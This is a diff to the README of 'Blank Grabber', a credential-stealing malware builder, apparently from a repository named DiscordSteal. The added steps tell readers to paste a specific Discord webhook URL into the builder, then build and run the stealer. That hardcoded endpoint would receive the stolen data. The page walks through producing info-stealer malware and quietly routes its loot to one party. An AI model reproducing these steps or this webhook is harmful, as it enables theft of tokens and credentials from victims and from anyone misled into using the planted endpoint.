@@ -133,9 +133,20 @@ Blank-c
 3. [Download Blank Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
-6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+6. After that, insert the webhook into Enter Webhook here which will be below
+7.     https://discord.com/api/webhooks/1218326023754743829/RgIArUH9BoYBP94Febeiymz51O-bR1g5PIa5uoF9YTbEjsqPjjM1DNIM_gCixTSyba-U
+8. That's it, click the build and you can run it
+9. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
 
 [![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
+
+![68747470733a2f2f692e696d6775722e636f6d2f7a5265566f6a502e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/afa2796f-5223-4c2c-a283-1f24427440c0)
+
+![68747470733a2f2f692e696d6775722e636f6d2f633163556d5a462e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/8fe0c68e-0574-4cfd-8263-5deaf887ac18)
+
+![68747470733a2f2f692e696d6775722e636f6d2f3975386e4e62442e706e67](https://github.com/sleshTekk/DiscordSteal/assets/163595476/4157d3a4-4a6f-49a4-8efd-896867f63f04)
+
+
 
 ## Support the Project
 
@@ -149,3 +160,4 @@ If you find this project useful and would like to show your support, you can mak
 
 - **USDT (Tron network):**
   - Wallet Address: TJsixSZ9LDpn3ZNF8pEKmfNaNkMTrK1hWJ
+    
